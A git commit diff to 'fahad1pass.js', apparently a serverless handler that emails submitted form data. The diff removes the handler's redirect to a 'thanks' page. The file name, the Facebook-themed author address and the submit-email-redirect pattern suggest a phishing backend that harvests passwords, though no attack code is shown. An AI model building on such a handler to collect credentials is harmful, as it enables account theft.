274be602a377feedcb51efc3fdb4eadc66a26ecf
apisubmit-8ll0irl <idfacebook443@gmail.com>
2025-08-17 20:37:14 +0500

    Update fahad1pass.js

--- fahad1pass.js
+++ fahad1pass.js
@@ -55,6 +55,5 @@ export default async function handler(req, res) {
     console.error("Email send error:", error);
   }
 
-  // Always redirect (success or failure)
-  return res.redirect(302, "https://thanks-rediricted-two.vercel.app/");
+  
 }
